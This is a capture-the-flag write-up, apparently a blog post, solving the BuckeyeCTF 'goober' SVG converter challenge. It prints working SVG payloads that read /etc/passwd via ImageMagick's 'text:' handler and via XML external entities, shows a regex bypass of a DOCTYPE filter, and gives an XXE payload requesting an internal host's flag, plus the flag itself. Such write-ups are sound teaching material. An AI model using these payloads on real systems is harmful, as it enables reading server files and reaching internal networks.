---
layout: post
current: post
cover:  assets/buckeye/nisala/cover2.webp
navigation: True
title: "goober"
date: 2022-11-10 09:00:00
tags: [BuckeyeCTF, web]
class: post-template
subclass: 'post'
author: nisala
---

How on earth do SVGs have so many security vulnerabilities?

## The Challenge

> Javascript has built-in functionality to convert SVGs to PNGs. But Javascript is slow. You know what's fast! Golang! I created goober, the world's first online SVG to PNG converter written in Go.

Alright, so here we have an SVG to PNG converter written in Go. It uses ImageMagick to do the conversion. The website runs on a public server, which is available at `172.10.0.101`. There's also an internal server running at `172.10.0.102` which contains the flag (it's at `172.10.0.102/flag`). So we need to get the flag from the internal server -- but we can only submit to the public server! So I guess we're going to have to make that request using SVGs.

## LFI

Searching around on the Internet, I found out that SVGs can be used to perform local file inclusion, which is an attack that can get arbitrary local files from a server. That LFI can even be used to read text files by putting `text:` in front of the file path (thanks ImageMagick!).

```xml
<svg height="800px" width="800px">
    <image height="800" width="800" href="text:/etc/passwd" />
</svg>
```

And we get a file!
![LFI of /etc/passwd](/assets/buckeye/nisala/lfi1.webp)

Unfortunately, our flag isn't on the public server -- it's on the private server, and we can't use this LFI attack to make HTTP requests. So we need to find another way to get the flag.

## LFI, but again and also more

Now, there's another way to get LFI with SVGs -- XML external entities. It turns out that with XML files, you can include external files in your file. These entities can also be from HTTP requests, so this is perfect for our purposes. And guess what? The XML parser is set up for this! Check out this line in `main.go`:

```go
data, err := libxml2.Parse(input, parser.Option(2))
```

Interesting -- what's `parser.Option(2)`? Looking online, it turns out that it turns on XML external entity parsing. So we can inject entities, right?

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<svg height="800px" width="800px">
    <text x="0" y="15" font-size="15" fill="red">&xxe;</text>
</svg>
```

Well, not so fast. Before data is put into the parser, the DOCTYPE tag is (supposed to be) removed with the following regex:

```go
reg := regexp.MustCompile(`<!DOCTYPE[^>[]*(\[[^]]*\])?>`)
contentSafe := reg.ReplaceAllString(contents, "")
```

Let's break this regex down. We start with `<!DOCTYPE`. Then, any character that isn't a `>` or `]` is matched. Then, the entity declarations are matched (`[`, anything, `]`), followed by `>` to close off the DOCTYPE tag. 

See the problem? Before entities, we match any characters (extraneous spaces, etc.) -- but after the entity declaration? Nothing. So all we have to do is add a space before `>`:

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/etc/passwd"> ] >
<svg height="800px" width="800px">
    <text x="0" y="15" font-size="15" fill="red">&xxe;</text>
</svg>
```

And there we go!:
![LFI of /etc/passwd, again](/assets/buckeye/nisala/lfi2.webp)

We can use this same approach to get the flag:
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://goober-internal:5001/flag"> ] >
<svg height="800px" width="800px">
    <text x="0" y="15" font-size="15" fill="red">&xxe;</text>
</svg>
```

![Flag image](/assets/buckeye/nisala/lfi3.webp)

And there's our flag: `buckeye{wh0_n33ds_4n_htm1_c4n4s}`